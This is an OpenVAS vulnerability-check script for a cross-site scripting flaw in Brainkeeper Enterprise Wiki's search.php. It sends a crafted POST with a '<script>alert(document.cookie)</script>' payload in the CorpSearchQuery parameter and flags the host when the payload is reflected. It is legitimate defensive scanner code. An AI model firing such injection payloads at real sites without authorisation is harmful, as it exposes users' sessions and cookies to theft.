###############################################################################
# OpenVAS Vulnerability Test
#
# Brainkeeper Enterprise Wiki 'search.php' Cross-Site Scripting Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (C) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802394");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2012-02-08 12:53:59 +0530 (Wed, 08 Feb 2012)");
  script_name("Brainkeeper Enterprise Wiki 'search.php' Cross-Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/109469/brainkeeper-xss.txt");
  script_xref(name:"URL", value:"http://st2tea.blogspot.in/2012/02/brainkeeper-enterprise-wiki-searchphp.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");

  script_tag(name:"affected", value:"Brainkeeper Enterprise WikiBrainkeeper");

  script_tag(name:"insight", value:"The flaw is due to an improper validation of user-supplied input
  via the 'CorpSearchQuery' parameter to search.php, which allows attacker to
  execute arbitrary HTML and script code on the user's browser session in the
  security context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Brainkeeper Enterprise Wiki and is prone to
  cross site scripting vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

brainkPort = http_get_port(default:80);
if(!http_can_host_php(port:brainkPort)) {
  exit(0);
}

useragent = http_get_user_agent();
host = http_host_name(port:brainkPort);

foreach dir (make_list_unique("/brainkeeper", "/brainkeeper_enterprise_wiki", http_cgi_dirs(port:brainkPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php"), port:brainkPort);

  if("BrainKeeper Enterprise Wiki" >< rcvRes &&
     "BrainKeeper, Inc" >< rcvRes)
  {

    url = dir + '/corp/search.php';

    postdata = "CorpSearchQuery=%22%3Cscript%3Ealert%28" +
               "document.cookie%29%3C%2Fscript%3E&x=38&y=15";

    brainkReq = string("POST ", url, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: ", useragent, "\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(postdata), "\r\n",
                      "\r\n", postdata);
    brainkRes = http_keepalive_send_recv(port:brainkPort, data:brainkReq);

    if(brainkRes =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< brainkRes)
    {
      security_message(port:brainkPort);
      exit(0);
    }
  }
}

exit(99);
